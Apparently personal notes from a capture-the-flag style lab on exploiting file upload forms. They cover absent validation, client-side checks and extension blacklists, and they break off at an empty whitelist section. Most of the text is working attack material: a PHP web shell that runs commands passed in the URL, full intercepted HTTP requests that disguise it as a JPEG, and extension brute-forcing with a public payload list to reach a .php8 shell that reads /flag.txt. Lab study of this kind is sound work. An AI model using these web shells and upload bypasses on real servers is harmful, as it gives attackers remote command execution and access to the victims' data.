File Upload


# Absent Validation
 

 echo "<?php echo gethostname(); ?>" > test.php

 upload the file and go to /uploads/test.php
 

# Upload Exploitation Web Shells

touch test2.php

nano test2.php

Copy:
```php

<?php system($_REQUEST['cmd']); ?>

```

upload the file and go to /uploads/test2.php?cmd=cat /flag.txt

# Client-Side Validation

- After poste a valid image to the upload 
- Intercept with burp and mofify the request like this:

```python
POST /upload.php HTTP/1.1
Host: 94.237.60.251:50697
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31070384352095504274360374143
Content-Length: 110908
Origin: http://94.237.60.251:50697
Connection: close
Referer: http://94.237.60.251:50697/

-----------------------------31070384352095504274360374143
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
-----------------------------31070384352095504274360374143--


```

upload the file and go to /profile_images/shell.php?cmd=cat /flag.txt


# Blacklist Filters

```shell
 wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

```
- Intercept the request on burp and send to intruder to brute force the extensions .php
- Next modify the request like this, after discovery the correct extension

```python

POST /upload.php HTTP/1.1
Host: 83.136.255.125:57766
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------100728475939235324011375106908
Content-Length: 262
Origin: http://83.136.255.125:57766
Connection: close
Referer: http://83.136.255.125:57766/

-----------------------------100728475939235324011375106908
Content-Disposition: form-data; name="uploadFile"; filename="shell.php8"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
-----------------------------100728475939235324011375106908--

```

upload the file and go to /profile_images/shell.php8?cmd=cat /flag.txt


# Whitelist Filters



